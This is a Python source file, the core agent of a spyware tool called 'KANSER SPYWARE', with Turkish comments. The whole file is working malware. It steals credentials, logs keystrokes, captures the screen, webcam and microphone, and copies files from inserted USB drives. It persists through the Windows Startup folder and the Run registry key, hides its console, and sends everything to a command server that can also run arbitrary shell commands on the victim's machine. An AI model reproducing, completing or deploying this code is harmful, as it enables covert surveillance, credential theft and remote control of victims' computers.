#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KANSER SPYWARE v1.0 — Agent Core
Multi-threaded veri toplayici + exfil motoru
"""
import os, sys, json, time, threading, socket, base64, sqlite3, shutil, tempfile, zipfile, io
from datetime import datetime

sys.path.insert(0, os.path.dirname(__file__))
from stealer import Stealer
from capture import Capture
from keylogger import Keylogger
from exfil import Exfil

CONFIG = {
    "server_host": "127.0.0.1",
    "server_port": 5555,
    "exfil_interval": 300,      # Veri gonderim araligi (saniye)
    "capture_interval": 60,      # Ekran goruntusu araligi
    "keylog_buffer": 50,         # Kac karakterde bir gonder
    "steal_on_start": True,      # Baslangicta tum credential'lari cal
    "usb_snatch": True,          # USB takilinca dosya kopyala
    "persist": True,             # Kalici ol
}
DATA_DIR = os.path.join(tempfile.gettempdir(), "KanserSpy")

class SpyAgent:
    def __init__(self):
        os.makedirs(DATA_DIR, exist_ok=True)
        self.stealer = Stealer()
        self.capture = Capture()
        self.keylogger = Keylogger()
        self.exfil = Exfil()
        self.sock = None
        self.running = True

    def connect(self):
        """Server'a baglan"""
        while self.running:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(30)
                self.sock.connect((CONFIG["server_host"], CONFIG["server_port"]))
                return True
            except:
                time.sleep(10)
        return False

    def send(self, data):
        """Veri gonder"""
        try:
            if self.sock:
                self.sock.send((json.dumps(data, default=str) + "\n").encode())
        except: pass

    def run(self):
        if not self.connect(): return
        self.send({"type": "agent_hello", "data": self._sysinfo()})

        if CONFIG["steal_on_start"]:
            threading.Thread(target=self._steal_all, daemon=True).start()

        if CONFIG["persist"]:
            threading.Thread(target=self._install_persist, daemon=True).start()

        threading.Thread(target=self.keylogger.start, args=(self._keylog_callback,), daemon=True).start()
        threading.Thread(target=self._capture_loop, daemon=True).start()
        threading.Thread(target=self._heartbeat, daemon=True).start()
        threading.Thread(target=self._usb_monitor, daemon=True).start()

        buf = ""
        while self.running:
            try:
                data = self.sock.recv(65536).decode(errors="ignore")
                if not data: break
                buf += data
                while "\n" in buf:
                    line, buf = buf.split("\n", 1)
                    try: self._handle_cmd(json.loads(line))
                    except: pass
            except: break
            time.sleep(0.1)

    def _sysinfo(self):
        import platform
        info = {
            "hostname": platform.node(),
            "os": f"{platform.system()} {platform.release()}",
            "user": os.getenv("USERNAME", os.getenv("USER", "?")),
            "arch": platform.machine(),
            "pid": os.getpid(),
            "time": datetime.now().isoformat()
        }
        return json.dumps(info)

    def _steal_all(self):
        """Tum credential'lari cal"""
        results = self.stealer.steal_all()
        self.send({"type": "credentials", "data": json.dumps(results)})

    def _keylog_callback(self, text):
        self.send({"type": "keylog", "data": text, "window": self._active_window()})

    def _active_window(self):
        try:
            if os.name == "nt":
                import ctypes
                hwnd = ctypes.windll.user32.GetForegroundWindow()
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                buf = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
                return buf.value
        except: pass
        return ""

    def _capture_loop(self):
        while self.running:
            try:
                ss = self.capture.screenshot()
                if ss:
                    self.send({"type": "screenshot", "data": ss})
            except: pass
            time.sleep(CONFIG["capture_interval"])

    def _heartbeat(self):
        while self.running:
            self.send({"type": "heartbeat", "data": "1"})
            time.sleep(60)

    def _usb_monitor(self):
        if not CONFIG["usb_snatch"]: return
        import string
        known = set()
        while self.running:
            try:
                drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\") and d not in "ABC"]
                new = set(drives) - known
                for d in new:
                    threading.Thread(target=self._snatch_usb, args=(d,), daemon=True).start()
                known = set(drives)
            except: pass
            time.sleep(3)

    def _snatch_usb(self, drive):
        dst = os.path.join(DATA_DIR, "usb_" + datetime.now().strftime("%Y%m%d_%H%M%S"))
        os.makedirs(dst, exist_ok=True)
        for root, dirs, files in os.walk(drive):
            for f in files:
                try:
                    if os.path.getsize(os.path.join(root, f)) < 10 * 1024 * 1024:
                        shutil.copy2(os.path.join(root, f), os.path.join(dst, f))
                except: pass
        self.send({"type": "usb_snatch", "data": {"drive": drive, "dest": dst}})

    def _install_persist(self):
        try:
            if os.name == "nt":
                exe = sys.executable
                dst = os.path.join(os.getenv("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "spyvhost.exe")
                os.makedirs(os.path.dirname(dst), exist_ok=True)
                shutil.copy2(exe, dst)
                import subprocess
                subprocess.run(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SpyService" /t REG_SZ /d "{dst}" /f', shell=True, capture_output=True)
        except: pass

    def _handle_cmd(self, msg):
        cmd = msg.get("cmd", "")
        data = msg.get("data", "")
        if cmd == "steal_now": threading.Thread(target=self._steal_all, daemon=True).start()
        elif cmd == "screenshot_now": threading.Thread(target=lambda: self.send({"type": "screenshot", "data": self.capture.screenshot()}), daemon=True).start()
        elif cmd == "webcam_now": threading.Thread(target=lambda: self.send({"type": "webcam", "data": self.capture.webcam()}), daemon=True).start()
        elif cmd == "mic_now": threading.Thread(target=lambda: self.send({"type": "mic", "data": self.capture.mic()}), daemon=True).start()
        elif cmd == "shell":
            try:
                import subprocess
                out = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT, timeout=30).decode(errors="ignore")
                self.send({"type": "shell", "data": out[:5000]})
            except Exception as e: self.send({"type": "shell", "data": str(e)})
        elif cmd == "exfil_files":
            threading.Thread(target=lambda: self.exfil.collect_and_send(self.send, data), daemon=True).start()
        elif cmd == "uninstall":
            self.running = False
            try:
                import subprocess
                subprocess.run('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SpyService" /f', shell=True, capture_output=True)
                dst = os.path.join(os.getenv("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "spyvhost.exe")
                if os.path.exists(dst): os.remove(dst)
            except: pass
            self.send({"type": "status", "data": "Uninstalled"})

if __name__ == "__main__":
    if os.name == "nt":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except: pass
    SpyAgent().run()
